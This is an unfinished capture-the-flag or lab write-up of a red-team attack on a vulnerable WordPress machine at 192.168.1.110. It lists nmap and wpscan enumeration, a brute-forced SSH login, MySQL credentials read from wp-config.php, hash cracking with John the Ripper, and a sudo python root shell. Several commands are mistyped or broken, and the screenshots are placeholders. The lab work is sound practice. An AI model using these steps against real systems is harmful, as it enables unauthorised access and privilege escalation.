# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services
_TODO: Fill out the information below._

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sV 192.168.1.110
  SCREENSHOOT


This scan identifies the services below as potential points of entry:
- Target 1
  - Port 22/TCP Open ssh
  - Port 80/tcp open http
  - Port 111/tcp Open rpcbind
  - Port 139/tcp Open netbios-ssn
  - Poert 445/tcp Open netbios-ssn
  

The following vulnerabilities were identified on each target:
- Target 1
  - List of Critical Vulnerabilities
Foloowing user were identified by running wpscan command
wpscan --url http://192.168.1.110/wordpress --enumerate u
-Micheal
-Steven

SCREENSHOOT

With a simple brut force user Michael password was cracked: Password was michael

 `flag1.txt`: 
    -Flag 1 was found in the following director:
    Command: cd /var/www/html
        :ls -al
        :nano services.html

        SCREENSHOOT

`flag2.txt`:
    -Flage 2 was found in following directories:
     Command: cd /var/www/
            : ls -al
        SCREENSHOOT


### Exploitation

Mysql server login credentials was listed in wp-config.php file
steven account was used then to execue python to escalte root preveliage


SSH into Micheael account
command: ssh micheal@192.168.1.110

SCREENSHOOT
Login credentials using MYSQL server were found in wp-config.php file within var/www/html/wordpress directory.

Command: mysql -u root -p
password: R@v3nSecurity
use wordpress;
show table;
SELECT * FROM wp_users

SCREENSHOT
SCREENSHOOT



Password was cracke using john ripper

command: john wp_hashes.txt

user steven password is cracke: pink84

sude python -c 'import pty;pty.spawn ('bin/bash");'

SCREENSHOOT


